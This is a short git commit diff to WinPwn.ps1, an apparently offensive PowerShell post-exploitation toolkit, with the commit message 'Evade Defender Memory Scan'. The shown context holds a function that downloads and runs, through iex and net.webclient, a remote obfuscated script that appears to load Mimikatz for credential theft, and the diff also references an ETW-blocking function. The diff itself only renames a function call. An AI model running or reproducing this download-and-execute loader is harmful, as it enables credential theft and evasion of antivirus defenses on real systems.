cad98a7b3d4310782dfc9ed456673751372ae089
S3cur3Th1sSh1t <27858067+S3cur3Th1sSh1t@users.noreply.github.com>
2020-06-03 19:20:28 +0200

    Evade Defender Memory Scan

--- WinPwn.ps1
+++ WinPwn.ps1
@@ -2746,7 +2746,7 @@ function fruit
 function mimiload
 {
 	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/loadmimi.ps1')
-	loadmimi
+	mimiload
 }
 
 function BlockEtw
